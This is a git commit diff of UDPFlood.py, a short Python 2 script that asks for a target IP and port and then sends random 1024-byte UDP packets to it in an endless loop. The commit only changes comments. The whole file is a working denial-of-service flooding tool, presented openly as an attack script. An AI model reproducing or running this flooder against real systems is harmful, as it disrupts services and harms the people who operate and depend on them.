4ea3f3b5c8b0baa4b7c8f93a6812d56382e8e366
Caleb-Shepard <Caleb-Shepard@users.noreply.github.com>
2017-09-04 08:37:30 -0400

    removed unnecessary comments

--- UDPFlood.py
+++ UDPFlood.py
@@ -1,18 +1,17 @@
-#similar scripts are easily found with a web search
-#mitigation for these attacks are usually upstream from your server
+# mitigation for these attacks are usually upstream from your server
 
-import socket #For socket creation later
-import random #So that we can have help creating a randomized packet later
+import socket 
+import random # The script will random packet sizes
 
 #Read user input
-ip=raw_input('Target IP: ') #The IP address to be atacked
-port=input('Port number: ') #Port we direct to attack
+ip=raw_input('Target IP: ') # The IP address to be atacked
+port=input('Port number: ') # Port we direct to attack
 
 sent=1
-bytes=random._urandom(1024) #Creates size beforehand so that we don't wind up recreating packets every time that we send one
+bytes=random._urandom(1024) # determine size before loop
 sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
 
-while 1: #Infinite loop
-    sock.sendto(bytes,(ip,port)) #send packet
-    print "Sent %s packets to %s at port %s." % (sent,ip,port) #comment this line if you don't want to print
-    sent= sent + 1
+while 1: # Infinite loop
+    sock.sendto(bytes,(ip,port)) # send packet
+    print "Sent %s packets to %s at port %s." % (sent,ip,port) # comment this line if you don't want to print
+    sent=sent + 1
